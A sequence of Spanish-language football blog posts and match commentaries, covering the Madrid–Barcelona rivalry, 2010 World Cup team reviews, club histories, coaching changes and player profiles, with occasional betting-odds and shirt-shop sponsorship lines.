ya tiene poco.Tal cual. Si el año pasado nos hartamos de escuchar la analogía entre nuestra Liga BBVA y el campeonato caledonio por la tiranía con la que, a la Rangers-Celtic, llevan despachándose Madrid y Barcelona durante los últimos cursos, el arranque de esta temporada, con la deplorable gresca supercopera, ha servido para confirmar que la clonación ha culminado. Mourinho y sus acólitos escribieron el guíon, los de azulgrana se apuntaron a la obrita y ‘voila! ya estamos como los escoces. Con un espectáculo acibarado en cartelera, que para colmo se repite varias veces al año, donde dos sujetos pretenden un pastel y en el tumulto no dudan en tirar de navaja si es menester para conseguirlo.Y ahora fuera ironía, si preguntan a cualquier aficionado del mundo por el Old Firm, seguro que en la respuesta incluirá también la palabra violencia. Por favor y a quien corresponda, paremos esto, que no se convierta en costumbre lo de barnizar asquerosamente lo que en esencia es, y fue ayer mientras se jugó, el mejor partido del año. Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line.Goleadores: Müller (5), Klose (4), Podolski (2), Cacau, Özil, Friedrich, Janssen y Khedira.Lo mejor: fútbol moderno, alegre y vistoso, con movimiento continuo, ataque a los espacios y capacidad goleadora. La sensación de que el equipo va a ir a más.Lo peor: la incapacidad demostrada frente a España, que mostró la diferencia existente entre los dos mejores equipos del campeonato.La estrella: Thomas Müller. Un atacante ubicuo y versátil, ha refrendado en el Mundial las estupendas impresiones que dejó en la Bundesliga. Inexplicablemente fuera del once oficial de la FIFA, es un crack del futuro inmediato.El momento: el segundo gol frente a Argentina, que dio paso al mayor rodillo visto en la segunda fase del campeonato, cuando empieza realmente lo serio.Ghana: Caído en cuartos de final. Dos partidos ganados, dos empatados y uno perdido, con cinco goles a favor y cuatro en contra. Goleadores: Gyan (3), Boateng y Muntari.Lo mejor: buena capacidad para madurar los partidos y crecer en ellos, y haber defendido hasta cuartos el honor del fútbol africano.Lo peor: poca creatividad en el juego, el partido contra una Australia disminuida y, sobre todo, haber tenido tan cerca las semifinales y no haber podido dar el último paso.La estrella: Asamoah Gyan. Aunque no hubiera sido uno de los delanteros más afilados del campeonato y el alma de la selección, merecería figurar aquí por haber tenido el valor de tirar el penalty de la tanda tras fallar unos minutos antes. Una muestra de valentía inolvidable.El momento: ese balón que empujaba todo un continente y escupió un travesaño que no entendió de mitos.Australia: eliminada en la primera fase. Un partido ganado, otro empatado y otro perdido, tres goles marcados y seis recibidos. Goleadores: Holman (2) y Cahill.Lo mejor: buen rendimiento goleador en relación al número de ocasiones creadas y la capacidad de supervivencia con diez frente a Ghana.Lo peor: planteamientos muy rácanos de Verbeek –tenía equipo para proponer algo más-, y la impresión de pelele dejada ante Alemania.La estrella: nos quedamos con el olfato goleador de Brett Holman, muy bien adaptado a una manera de jugar diferente a la holandesa.El momento: el segundo gol a Serbia en el último partido, que acercaba levemente la clasificación para octavos; al final, el lastre de los goles encajados resultó excesivo.Serbia: caída en la primera fase. Un partido ganado y dos perdidos, dos goles a favor y tres en contra. Goleadores: Jovanovic y Pantelic.Lo mejor: por decir algo, el juego en algunas fases del partido contra Alemania.Lo peor: seguramente les pesó la etiqueta de selección revelación. Zigic estuvo seco, y alguien debió decirle antes a los serbios que tocar el balón con la mano en el área es penalty.La estrella: Milan Jovanovic. Sus conducciones y toques en línea de tres cuartos siempre generaron peligro, y no extraña nada que haya fichado por el Liverpool.El momento: el gol y la victoria ante Alemania, que en condiciones normales deberían haber supuesto la clasificación de los de Antic.“Aquí no se puede jugar al fútbol ni tampoco plantar melones, pero esta tierra daría unas alcachofas riquísimas” Habla José El Monarca, agricultor murciano y desopilante fuente del As ante el partido que finalmente jugarán Lituania y España esta noche sobre la anómala superficie del Steponas Darius y Stasys Girenas de Kaunas. Pero no te han escuchado Monarca, al menos no el delegado UEFA, Rainer Koch ni el árbitro del encuentro, Laurent Duhamel y el partido se jugará salvo decisión de última hora. Y que quieren que les diga, yo me alegro. Más que nada porque el factor terreno de juego ha convertido un trámite desabrido en un reto. ¿Podrán los paladines del juego raso sobreponerse a los infrafutboleros elementos? ¿Viviremos un final con los lituanos besando la arena local en señal de agradecimiento por una victoria insospechada? Ni que decir tiene que más de uno se apostará unos euros a sorpresa báltica. ¿A un empatito tal vez? La ocasión invita a ello.En España habrá cambios. Uno no sabe muy bien si por indicación de los altos mandos, por la tradicionalmente óptima adaptación de los norteños a terrenos abruptos o por pura decisión técnica, la selección podría afrontar lo de Kaunas con los tres representantes del Athletic Club en el once. Llorente, un Iraola de estreno y Javi Martínez que formarían de inicio junto a Casillas, Albiol, Piqué, Arbeloa,  Xabi Alonso, Xavi, Cazorla y Villa. El míster afronta el doble compromiso internacional con la idea de repartir minutos y en consecuencia dará descanso a algunos hombres clave en Kaunas. ¿Claves? Ustedes saben que cada partido es una incógnita antes de abrirlo pero imagino que ante un conjunto fuerte sobre campo irregular serán ganar las disputas arropándose en el centro del campo, concentración máxima en las segundas jugadas y aprovechar la jerarquía en el juego aéreo de Fernando Llorente. Fútbol práctico en definitiva.Lituania, que llega con al cara lavada  a base de cambios en el once desde que la derrota en Salamanca (3-1) querrán destruir, ya lo anticipó Jankauskas en la previa, y ordenarse para sufrir lo menos posible en defensa. Cuando toque ir hacia arriba van a buscar transiciones rápidas ya que ni el terreno de juego ni las vergüenzas técnicas de los medios invitan a otro plan. Defensa por acumulación y que Cesnaukis, el más dotado, se la ceda a Sernas para el bullicio o a Danilevicius para el oficio es lo que marca su pizarra. Mínimo riesgo. Para que engañarnos, ni suena ni es gran cosa pero puede servir contra un rival al que le fastidie caminar con el barro pegado a los zapatos. Desde luego que los lituanos tienen que estar mirando a la arena con una media sonrisa en la cara y fantaseando con en lo que apuntan en bwin ¿Y si el tiqui-taca se quedara helado en Kaunas?Aun con arena de por medio la victoria local se paga a 9.50 por tan solo 1.30 la española pero, ojo, el empate anda por unos unos jugosos 4.80.Voy a hacer como que no siento curiosidad, como que me satura y me aburre vuestro ridículo pique infantil, que ni me va ni me viene. Que tampoco es para tanto.Ocurre que para mí el fútbol tiene mucho de territorialidad y de orgullo local. Un poco como lo que Paul Auster definía como ese milagro que permitía a Europa y los europeos odiarse sin tener que destruirse. El fútbol como la excusa perfecta para enfrentarse y definir identidades sin necesidad de sacar los tanques a la calle, como una especie de moderna guerra tribal en la que las batallas se saldan sin muertos. Y como expresión de terruñismo, como exaltación de lo propio frente a lo ajeno, me resulta complicado entender los sentimientos que puede despertar en un seguidor de un equipo de fútbol el medirse sobre el verde a otro equipo de fútbol de su misma ciudad. Porque se supone que los dos defienden un mismo territorio, una misma identidad local o regional y comparten un mismo sentir sobre el suelo que pisan. Y no, no puedo considerar el Athletic-Real Sociedad como un derbi, por mucho que ambos equipos pertenezcan a una misma región o, si nos queremos poner constitucionalistas, una misma comunidad autónoma y aunque así haya sido socialmente aceptado a lo largo de los años. Del mismo modo que nunca consideraría como un derbi propiamente dicho un Athletic-Alavés o un Athletic-Éibar. Entiendo que lo que un donostiarra defiende con orgullo a través de su equipo de fútbol no es lo mismo que lo que yo defiendo y de lo que yo me enorgullezco. Porque Bilbao y San Sebastián son dos realidades sociales bien diferentes, cada una con sus peculiaridades, como lo es Vitoria o como lo es Éibar. Que cuando toca medir fuerzas con los guipuzcoanos ellos vienen con su Paseo de la Concha, con su aire bohemio y con que sus pintxos son mejores que los nuestros, pero yo me sigo quedando con nuestro Guggenheim, nuestro rollo post-industrial y nuestro bacalao. Y eso es orgullo local.Supongo, y digo supongo porque nadie aún ha sabido explicármelo bien, que cuando tu equipo, ese que representa todo aquello con lo que tú te identificas, se enfrenta a otro equipo con el que comparte un mismo espacio vital, la territorialidad deja de tener peso y se convierte en un argumento superfluo. Que entonces entran en juego otro tipo de condiciones y de elementos de identificación. Qué sé yo, las capas sociales, los barrios, los orígenes… Entonces es cuando me doy cuenta de que eso de vivr un derbi local debe de ser, con perdón, la hostia. Y miro a mis amigos madrileños, y los veo exaltados, llamando ‘hijo puta’ a su colega, a su tío, o incluso a su propio hermano, cuando les toca enfrentarse entre sí. O a mi amigo Ferran, con un cisma familiar montado cada seis meses porque su madre es culé y su padre y él pericos. Y veo a los sevillistas tirar de sorna para tratar de ridiculizar a su compañero de trabajo bético, ese mismo con el que al terminar la jornada laboral van a ir a apretarse unas cervecitas. Y es en ese momento cuando el trauma se hace más insoportable. Cuando la sensación de que estoy fuera de todo ese negociado se hace palpable. Cuando vuelvo a ser consciente de que jamás podré saber lo que se siente al vivir un derbi. Cinco años después de su último título liguero, el Chelsea volvió a alzar el trofeo de la Premier League para romper la hegemonía mancuniana del presente lustro. Y lo hizo de manera absolutamente merecida. En estos tiempos en los que parece que los títulos no solo se tienen que ganar, sino que además se tienen que merecer, el equipo dirigido por José Mourinho fue, con diferencia, el primero de los meritorios presentados a concurso. Líder sin interrupción desde la primera jornada, sufriendo únicamente dos derrotas en lo que llevamos de torneo, dominó la competición de principio a fin y realmente no vio peligrar su candidatura en ningún momento de la temporada. No hubo rival que pudiese competir en regularidad y en solidez con los Blues.Un arranque de temporada estratosférico, con Cesc Fàbregas y Diego Costa en su mejor nivel y formando un dueto de ensueño, fue más que suficiente para llegar al cambio de año en ventajosa posición. El catalán encontró el acomodo ideal en los esquemas de Mourinho en tiempo récord. Se vio protagonista y supo asumir el rol con naturalidad. Asistido por un Fàbregas desatado, Diego Costa parecía confirmar la idoneidad de su contratación jornada tras jornada. Después vendría el bajón, las lesiones encadenadas y, cómo no, la puesta en entredicho de su aportación en el global de la temporada. Pero el papel del hispano-brasileño en el arranque fue absolutamente decisivo.Se habló mucho a lo largo de todo el año de un Chelsea aburrido. Aburrido sí, pero tremendamente efectivo. El equipo de Mourinho volvió a ser ese motor diésel prácticamente infalible, sin estridencias, sin resultados desorbitados, siempre en el rango de revoluciones ideal. Sin sobresalientes, pero tampoco suspensos. Saliendo airoso allí donde sus principales rivales por el título tropezaban y apoyado siempre en una rocosa defensa a la mourinhista manera, con un John Terry rejuvenecido y un centro del campo blindado sobre la figura de Matic. Cimientos sólidos y ejecución de la obra sin barroquismos, ciñéndose a lo arquitectónicamente necesario para que el edificio del Chelsea se elevara más que los del resto sin riesgo de derrumbe.No cabe, pues, hablar de un título escasamente merecido.Se pueden imaginar que no es descabellado este resultado. El Milan, con Bárbara Berlusconi como flamante ejecutora, ha despedido a Allegri después de que el equipo despachara el enésimo ridículo contra el recien ascendido Sassuolo. Como en San Siro las cosas son como son, el que gusta para ocupar el banquillo es Clarence Seedorf, que agota su fútbol en el Botafogo y se ha sacado el título de entrenador por correspondencia. También suena pero con menos fuerza Pippo Inzaghi, cuya amplia experiencia se resume en ocho meses al frente del Milan juvenil. Asumirá, de momento, Mauro Tassotti, el más experto con diferencia de los candidatos. ¿Se mantendrá? Pues qué quieren que les diga, que sus diez años de callo junto a Zaccheroni, Ancellotti, Leonardo o el propio Allegri le convierten en una opción demasiado sensata como para que los Berlusconi ni siquiera se la planteen.Allegri, más que culpable aunque lleva lo suyo en la mochila, ha sido víctima de la decadencia que desgasta al club desde  hace años y  se ha manifestado con fuerza en las últimas dos temporadas. Echar un vistazo a San Siro es escuchar el sonido de los gusanos comiéndose lo que un día fue hermoso. El Sharaawy y Balotelli amortiguaron levemente el ruido el año pasado pero la descomposición ha seguido su curso inevitable. La sartenada de plantillas absurdas que Galliani y Braida vienen regalando al club en los últimos tiempos han terminado por poner en la picota al viejo dirigente, que dejará el Milan tan desangelado como lo agarró hace casi treinta años.El Madrid no tenía ningún argumento para enfrentarse a un equipo más serio, más trabajado, más desequilibrante y mucho más solidario que el que plantó Benítez sobre el césped.Benítez es el chico de la curva. Va en el asiento trasero del coche y señala los estadios diciendo: ahí morí yo. Empiezo a entender que lo del Liverpool fue como cuando una noche te ligas a la guapa de la pandilla. La excepción, vaya. Lo normal es mendigar una noche de pasión tibia y etílica a cualquiera. Lo otro pasa una vez en la vida. Lo de Rafa Benítez empieza a ser habitual. Cuando se habla del milagro del Liverpool siempre pienso primero en que llegó al maldito minuto 45 perdiendo tres a cero en una final de Champions. Eso es, como poco, para desconfiar. ¿Por qué entrena Benítez al Madrid? Supongo que por lo mismo que lo hizo Pellegrini o Ancelotti: por nada en particular. El Madrid no tiene discurso de club serio. Es una partida de Pro Evolution Soccer llevada al extremo. Me acordé de Florentino en Son Moix. Cicinho, Raúl Bravo, Gravesen y Robinho eran titulares. Helguera y Salgado comían pipas en el banquillo. El Mallorca ganó y Florentino se fue. Por entonces estaban a diez puntos del Barcelona. Hoy solo a seis.Tiene el Madrid un problema con la literatura. Quieren escribir poesía pero apenas saben redactar parrafitos de prosa aseados. Queda mucha temporada y en el Real Madrid, como en la casa de Gran Hermano, todo se magnifica. Siempre les quedará la Champions como a Bogart y Bergman les quedaba París, aunque sus vidas fueran una pena. Pero el partido contra el PSG, también en casa, puede servir para disuadirlos del milagro. Lo normal es que un equipo que juegue tan mal acabe perdiendo, ya sea contra el Odense o contra la Juve, como el año pasado.El estúpidamente llamado “Clásico” traerá consecuencias –por cierto, la RAE admite derbi como “Encuentro, por lo común futbolístico, entre dos equipos cuyos seguidores mantienen constante rivalidad, casi siempre por motivos regionales o localistas”-. Dicen que los jugadores del Madrid le están haciendo la cama a Benítez. No lo veo. Nadie es tan tonto como para dejarse humillar así, ni siquiera algunos jugadores del Madrid que no parecen tener demasiadas luces. El problema parece otro: la plantilla no está compensada, no están bien preparados físicamente, llevan años dependiendo demasiado de Cristiano Ronaldo, las titularidades “impuestas” de Bale o Benzema afectan negativamente al juego.El Madrid está a nivel López Caro. Igual de absurdo y plano. El Barça sin necesidad de ser lo que fue con Guardiola es, de momento, campeón de Europa, de Liga y de Copa. Y va líder en solitario. Ya no sé si el Madrid es un equipo para mandar o para que le manden. Si es lo primero, le falta fútbol. Si es lo segundo, dudo que Florentino Pérez sea el personaje adecuado. Lo suyo no es estético, sino económico. El Madrid es una empresa que, cada fin de semana, se viste de blanco para patear un balón. Como una liguilla de barrio, como una pachanga dominical. Florentino Pérez ha ratificado al entrenador esta misma tarde. Dice que Benítez está empezando y que los resultados vendrán solos. Y también ha dicho que “esta plantilla sufrió un desgaste paulatino desde enero de este año”. Es decir, la responsabilidad de Benítez descansa sobre la espalda de Ancelotti. Como la herencia de Zapatero, pero más desvergonzado aún. “Mucho de lo que pasa es culpa mía” dijo cuando le preguntaron por el descontento de los jugadores, “por no salir a desmentir todas las mentiras que se publican”. Y después conspiraciones, campañas de acoso de medios, manos negras, contubernios masónicos y chemtrails.No hay que sacar más conclusiones. Son sólo tres puntos que no se suman. Podemos analizar las sensaciones. Lo intangible. Por ejemplo, que te den un meneo en tu casa, delante de tu afición, tras polémicas extradeportivas, con una plantilla exigua. Uy. Quizá no sea un intangible. Quizá sea algo tan palpable como que el Barcelona se va en la clasificación. Y Benzema –el único delantero puro de la plantilla- está pendiente de un proceso judicial, y Cristiano ha perdido el olfato, y en el medio del campo nadie manda con el balón. Y la charlotada de De Gea en verano. O las lesiones de Bale. O quizá estaba el partido para Drenthe. O vuelve Ancelotti. O sube al primer equipo Zidane. De momento nos quedamos con la coreografía del sábado. Un bonito baile. A partir de ahora, averigua.No existe duda sobre el trabajo de Mourinho en el torneo de la regularidad (sí cabrían, sin embargo, en competición europea). Sus méritos son notorios y evidentes… pero también se aprovechan de los deméritos ajenos. De un City con una plantilla carísima pero dudosamente aprovechable y dirigido por un técnico estigmatizado por la derrota. De un Arsenal tan irregular como de costumbre y en el que Wenger cada vez tiene la silla más carcomida. De un United en plena reconstrucción y al que van Gaal tardó cuatro meses en encontrar el reglaje que le hiciera, al menos, carburar y dejar de quemar carbonilla. Por eso sorprende más, si cabe, que en el momento de la victoria, en el espacio reservado para las celebraciones, para la alegría y para las palmaditas en la espalda a los chicos por el trabajo bien hecho, José Mourinho volviera a la trinchera. ‘Es un sentimiento especial, porque no soy la persona más inteligente del mundo cuando escojo país y equipo en el que entrenar. Pude haber escogido otro país y otro club en el que ganar ligas fuese más sencillo, pero escogí la liga más complicada de ganar de Europa‘. A Mourinho le traiciona con frecuencia la querencia por su propia caricatura. Se empeña en ceñirse a un papel innecesario y que no hace ningún bien a su imagen pública. Lo de ayer, deslizando el recadito y tratando de acumular una dosis extra de méritos cuando solo un necio le negaría su protagonismo en el título del Chelsea, raya en lo enfermizo y demuestra que el portugués está mucho más preocupado por sus críticos de lo que él mismo trata de hacer creer. El Chelsea de Hazard, de Courtois, de Fàbregas, de Oscar y, por supuesto, de José Mourinho es el justísimo campeón de la Premier League 2014/15. Todo lo demás es folklore. El equipo de la aspirina (o el del Alka-Seltzer, o el del Redoxon, o el del…). El equipo que el miércoles, en el partido de ida de los octavos de final de la Champions League disputado en el BayArena, dio un considerable meneo al Atlético de Madrid tiene una historia detrás. Una historia romántica, por mucho que esto chirríe cuando hablamos del equipo creado bajo el manto de una de las farmacéuticas más grandes y poderosas del planeta, ceñida al amateurismo más inocente que gobernaba la práctica del fútbol en Alemania allá en los albores del siglo XX. Porque la ya centenaria historia del Bayer 04 Leverkusen (uno de los dos equipos de la Bundesliga, junto al Wolfsburg de la Volkswagen, que no pertenece a sus socios, sino a una entidad empresarial) arranca con una carta. Una carta repleta de ilusiones. La carta que Wilhelm Hausschild, trabajador de la farmacéutica, decidió remitir en representación de más de un centenar de compañeros a sus superiores en la Bayer Aktiengesellschaft solicitando la creación de un club gimnástico y deportivo en la empresa, un día de febrero de 1903. La petición, en una época en la que la actividad deportiva se desarrollaba sobre escenarios muy diferentes a los actuales y casi siempre bajo el auspicio de asociaciones profesionales o empresas preocupadas por procurar a sus empleados unas mejores condiciones de vida, fue bien recibida por la compañía, que por aquel entonces aún se dedicaba a la fabricación de pinturas y derivados. Así, varios meses después, se fundaba la sociedad deportiva Turn-und Spielverein Bayer 04 Leverkusen, germen del actual equipo. Era el primero de julio del año 1904, tiempos en los que el fútbol era aún un entretenimiento residual frente a otras disciplinas gimnásticas pero con cada vez mayor número de adeptos interesados por el nuevo juego llegado desde Inglaterra. No fue, sin embargo, hasta tres años más tarde cuando la sociedad deportiva creada por la Bayer decidió abrir sus actividades y considerar la inclusión del fútbol. El treinta y uno de mayo de 1907 fue así constituida la sección de fútbol de la organización. Con una curiosa condición, eso sí. Tal y como se reconoce en la propia web oficial del club, aquellos miembros fundadores acataron el compromiso de entrenar al menos una vez a la semana empleando balones medicinales en sus ejercicios, como gesto de voluntad de mantener siempre una cierta vinculación con la práctica gimnástica. Dos décadas más tarde, y superado el parón de la actividad durante la Primera Guerra Mundial, el cada vez más exitoso fútbol se veía obligado a separar su organización de la de la primigenia asociación gimnástica. Fue constituido así el Sportvereinigung Bayer 04 Leverkusen, que diferenciaría y englobaría las actividades de fútbol, balonmano, boxeo y atletismo y que se mantendría vigente casi un siglo, hasta que en el año 1999 el fútbol fue definitivamente separado del resto de expresiones deportivas bajo la nomenclatura, actualmente conocida, de Bayer 04 Leverkusen GmbH.Puedes comprar camisetas del Bayer 04 Leverkusen en Classic Football Shirts, la tienda online especializada en camisetas de futbol de todo el mundo. Argentina amaneció en la mañana del pasado domingo con la dolorosa resaca provocada por un nuevo título que se había escapado. Incapaz de superar el ardor combativo y la predeterminación de Chile, la albiceleste hizo revivir a todo el país, un año después de sucumbir ante Alemania en Maracaná, la amargura de la derrota y el sabor más ingrato de la competición.Los grandes ídolos, las súper estrellas, los mejores no solo tienen derechos y privilegios especiales. También tienen obligaciones extraordinarias y responsabilidades superlativas, muchas veces muy complicadas de atender con garantía de éxito. Y sobre Leo Messi, indudablemente el mejor y más determinante futbolista del mundo en la actualidad, recae la obligación moral de reflotar a Argentina y de recuperar su lanceado orgullo haciendo valer su indiscutible preeminencia futbolística, pocas veces discutida como integrante del FC Barcelona y tan extrañada cuando viste de albiceleste. Se achaca al genio rosarino una suerte de indolencia y pasividad (argentinizada como ‘pechofrío‘) en los malos momentos del combinado nacional que choca frontalmente con la habitual demanda hormonal de la afición argentina. El temperamento no basta con tenerlo, también hay que exhibirlo.Pero ocurre que Messi hace mucho tiempo que dejó de ser argentino. Y no se me interprete mal. No hablo de sentimiento patriótico, no. Hablo de fútbol. De concepción del juego, de manejo de las situaciones adversas en el césped, de interpretación de las señales procedentes del exterior. De cómo entender todo el tinglado este de la pelotita, la supremacía, el equipo y los pechos fríos, tibios y calientes. De aquellas cosas de las que, por suerte o por desgracia, el pequeño Leo comenzó a alejarse allá por el año 2000, con apenas trece años. De un fútbol, el argentino, que arrancaba una penosa travesía por el desierto, tanto a nivel deportivo como institucional y organizativo. Nadie diría, viéndolo jugar de azulgrana, que Messi olvidó la frescura y la alegría de aquellos complicados años sobre la tierra de los campos de Rosario. Pero cuando se trata de enfundarse la albiceleste Leo se convierte de pronto en un extraño, en alguien ajeno a todo ese bullicio y esa dramática y pasional exigencia. En alguien que es repudiado incluso por no pocos compatriotas que reclaman corazón y huevo por encima de fútbol. Porque Leo, tan argentino como cualquiera de sus compañeros, ya no perderá jamás el traje de futbolista europeo. De talento criado, atendido y educado en un ambiente que no entiende de orgullos nacionales y de guerras tribales cuando la pelota comienza a rodar.Leo Messi tiene su propio espacio reservado en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo.Sin estadio propio, mirándole la matrícula a la Juve, con alguna alegría europea sí pero arrastrándose por Italia. Que esto es el final de un ciclo lo explicaba con bastante mala leche pero bien clarito el director general de la Juventus, Giuseppe Marotta, hace un rato. “En el fútbol hay ciclos y lo más difícil para un dirigente es comprender cuando comienza el declive.” Se va Allegri pero el problema se queda en casa. Estoy seguro que en las legendarias parrandas de Berlusconi en su mansión de Arcore siempre hubo uno como Massimiliano Allegri. Uno al que evocar levemente cuando las nubes de farlopa, de alcohol y bailarinas de lujo saltando del burlesque a lo otro con soltura dejan paso a la resaca. ¿Lo recuerdas, Silvio? Paraba mucho por aqui hace tres años y nos habíamos acostumbrado a su cara. Buen tipo Max. ¡Acuérdate de cuando la liga! Estaba ahí y no molestaba. Claro que si se atrevía a molestar tampoco hubiera podido porque las cosas  en Villa San Martino llevan su propio curso.Foto: AC MIlan La Serie A es la cuarentona que todavía tiene algo. El cemento supura óxido en Via del Mare, en el Dall’Ara, en San Siro o en La Favorita pero aun así es bello. Fachadas comidas por el grafitti tifoso y de repente un plano hermoso. Campos que parecen cargueros destrozados cortando mares hacia ninguna parte y de pronto un golazo. Y rasgando el silencio que escupen los graderíos, por encima de esas gradas masticadas y escupidas con desdén al suelo por la crísis, se elevan un puñado de hombres buenos. Futbolistas por los que merece la pena comprar el periódico los lunes. Uno de ellos es Fabrizio Miccoli.A Miccoli hace tiempo que se le pasó el arroz y por mucho que siga picando al timbre de Prandelli cada domingo me resulta complicado imaginarlo ya como futbolista de éxito. Demasiado arrabalero, demasiado regateador, demasiada querencia por la vida tranquila en Palermo. Demasiado gordo. Miccoli la tuvo a golpe de clase y regate pícaro hace unos años, pero ya no llegará. O al menos no parece. No obstante este año la está liando en la liga y eso sí merece un repaso. Con 11 goles y 12 pases de gol Maradona en Salento ha vuelto a pedir foco.Miccoli sigue con la suya. Con la jugadita en segunda línea, con ese guardar la pelota bajo su metro sesenta de puro artista de descampado. El gordo recibe y el gordo la filtra entre la defensa rival para el que llegue. De cuando en cuando Maradonita pega un regate y suelta un remate a puerta con veneno pero lo suyo es la zona imaginativa. Siempre lo ha sido y ahora, en este Palermo francamente devaluado, ha vuelto a encontrar su ritmo. Miccoli es el motor de los rosas y seguramente merezca ir a la selección.El otro día declaró a La Reppublica que Palermo era su casa, que estaba encantado de que allí le tratasen como a uno más y que a la orilla del Tirreno se iba a quedar. Hace nada estuvo la inauguración del Zampacenter (el tantas veces planificado y por fin inaugurado mamotreto comercial del presidente Zamparini en Palermo) y se le vió paseando por las galerías con la naturalidad del que sabe que está en casa. Tengo mis dudas de que los palernitanos necesiten un nuevo centro comercial pero a Miccoli lo necesitan como el comer. Por endulzar el primer café del lunes, ya saben. Partidazo en Málaga (2-3). Locales, visitantes y La Bombonera entera (eléctrico el ambiente vivido en el estadio malaguista) demostraron que sólo es lunes en algunos campos y con algunos equipos. Cinco jugosos goles en el tanteador y el submarino que sigue aprovechando la corriente, impulsado por su excelente momento de forma y un Santi Cazorla estelar, hasta llegar a un segundo puesto en la tabla clasificatoria con el que ni los más optimistas contaban. El Málaga fue un rival digno. Los andaluces mostraron carácter,  una ilusionante querencia por el buen fútbol y destellos individuales interesantes. Aun con todo siguen sin estrenarse ante su aficiónEn la primera parte estuvo la miga. Los boquerones supieron golpear primero gracias a una efectiva mezcla de estrategia y clase con Eliseu en el papel protagonista. Golazo el primero de la noche. Tocaban con fluidez los de Jesualdo pero con el premio en el bolsillo decidieron mudarse unos metros atrás y buscar suerte a la contra lanzando al habilidoso Quincy y a Rondón. Craso error. Olvidaron que regalar la pelotita al Villarreal no suele traer más que quebraderos de cabeza. La maquinaria amarilla comenzaba a funcionar y el buen gol de Cazorla, inesperado según estaban las cosas, termino de nutrir el motor con el mejor aceite. Los amarillos tiraban de combinatoria de medio campo hacia adelante (con Senna y Valero cimentando la viva actividad de Nilmar, Cazorla y Rossi) y se imponían metro a metro. Tan bueno fue el trabajo que tres minutos después lograron voltear el marcador gracias a un tiro realmente inspirado, puro nueve,  de Rossi.Con el 1 a 2 el Málaga estaba en la lona y parecía incapaz de cambiar el discurso. Hasta que apareció el nuevo socio del club del yo me lo guiso yo me lo como. Hasta que entró en escena Quincy. Tan individualista como venenoso mientras le aguantó el motor, burló a dos rivales en la banda izquierda antes de servir un centro clínico a la cabeza de Rondón. Empate. El Málaga volvía de entre los muertos y al menos durante un instante pareció asentarse. Hasta que el Villarreal consiguió enterrarlo pocos minutos después gracias a un disparo duro y cruzado de Santi Cazorla, el mejor del choque, ante el que el meta local Rubén (inconstante durante todo el choque) pudo hacer algo más. Digo que el gol de Cazorla enterró a los boquerones pero mentiría si no incluyera a Marchena y a Teixeira Vitienes en el cortejo fúnebre. Vean el teatro de ese actor chusco que alguno sigue empeñado en reivindicar a base de récords, provocando la expulsión de Eliseu y me darán la razón invariablemente.De ahí al final, durante toda la segunda parte, el partido fue un juego en el que el Málaga dicto las reglas.‘En mi casa no se juega al rugby. Si quieres hacer deporte, tendrá que ser el fútbol. No quiero heridos en mi casa cada fin de semana‘. Sisifo Cahill lo tenía claro. Pese a proceder de un país en el que el balón oval es religión, sus hijos no practicarían un deporte tan arriesgado como el rugby. Apoyada en la afición por el fútbol de su marido Tim, un inglés afincado en Sidney, la madre de los hermanos Cahill consiguió que sus tres hijos ocuparan su infancia pateando balones en busca del gol, no agarrándolos con las manos y corriendo con ellos esquivando placajes, como hubiese sido probablemente más propio y natural. Y, al menos los dos menores, no salieron malos.Tim Cahill tenía solo catorce años cuando el fútbol decidió abrirle sus puertas de par en par. Conocida su ascendencia samoana por parte de madre, fue invitado por la federación del país a participar en la Copa de Oceanía sub’20 en representación de la débil selección del archipiélago polinesio. En un torneo para hombres, el niño Tim apenas disputó una decena de minutos de la basura repartidos entre los choques frente a Nueva Zelanda y Vanuatu. Doce años más tarde, en 2006, el mediano de los Cahill debutaba en un Campeonato del Mundo representando a Australia en el retorno del gigante oceánico a la primera escena del fútbol mundial. Repetiría en las citas de 2010 y de 2014, para acabar convirtiéndose en uno de los mejores futbolistas aussies de la historia, siendo además el máximo goleador histórico de los socceroos en Campeonatos del Mundo.Pero la historia del centrocampista australiano esconde una anécdota oculta. Uno de esos requiebros del guión que acuden de manera inesperada a juguetear caprichosamente con el historial de un futbolista y que pudo haber cambiado considerablemente el devenir de su carrera profesional. Porque mucho antes de convertirse en una referencia ineludible del fútbol australiano, Cahill no solo jugó para las categorías inferiores de la federación de Samoa. Estuvo a punto de convertirse en internacional absoluto por la República de Irlanda.Había dado ya el salto a Inglaterra y destacaba en las filas del Millwall, cuando el seleccionador irlandés Mick McCarthy, bajo cuyas órdenes había estado en el equipo londinense, decidió tantear la posibilidad de que Tim, hijo de inglés y nieto de irlandés y escocesa, jugase para el seleccionado de los Boys in green. Pero la voluntad de McCarthy y del propio Cahill, deseoso ya de poder disputar partidos de primera plana internacional y de postularse de cara al Mundial de 2002, chocó frontalmente con los impedimentos y las trabas impuestas por la FIFA. Aquellos minutos disputados cuando apenas era un adolescente con el equipo sub’20 de Samoa le imposibilitaban para jugar con cualquier otra selección nacional. A los efectos futbolísticos, Cahill había tomado la decisión de ser samoano y pese a que la federación del pequeño país polinesio manifestó su firme intención de no presentar reclamación alguna en caso de que el futbolista acabase finalmente jugando para Irlanda, la federación internacional se mantuvo firme en su decisión. No fue finalmente necesario que Cahill y sus abogados acudieran a la justicia.Queda una jornada para que termine la fase de grupos de la Liga de Campeones y empiece la Copa de Europa, el torneo de clubes por antonomasia. Por ello, parece un buen momento de echar un vistazo a cómo están los grupos, quién tiene posibilidades de pasar y quién no. La primera conclusión es que gran parte del pescado está vendido, con 12 equipos ya en octavos y la lucha, salvo en casos marginales, focalizada en cuestiones menores. La segunda, que salvo catástrofe van a entrar los cuatro ingleses, los tres españoles, los tres italianos y dos de los tres alemanes; o sea, el fútbol europeo está cada vez más centralizado. Vamos allá, en cualquier caso:Grupo A: Domina el Tottenham de Gareth Bale un grupo donde ha destacado la alegría del juego, la abundancia de goles y algún partidazo como el que enfrentó a los Spurs con el Inter en San Siro. A los de Redknapp les basta un punto en Enschede para ser campeones de grupo, y sólo perderán la primera plaza si son derrotados en ese partido y el dubitativo Inter vence en el Weserstadion de Bremen. El Twente tiene asegurada la Europa League, y bastante tiene el Werder con decidir o no si mantienen al eterno Thomas Schaaf.Grupo B: Quizá el grupo con menor nivel global de la Champions, liderado significativamente por un Schalke que pena en la Bundesliga y cuya defensa es una ruina. Huntelaar aseguró ayer la clasificación de los germanos, que serán campeones de grupo siempre que el Lyon no gane al Hapoel en Gerland; en este caso, ellos también deberían ganar al Benfica para mantener la primera plaza. Los 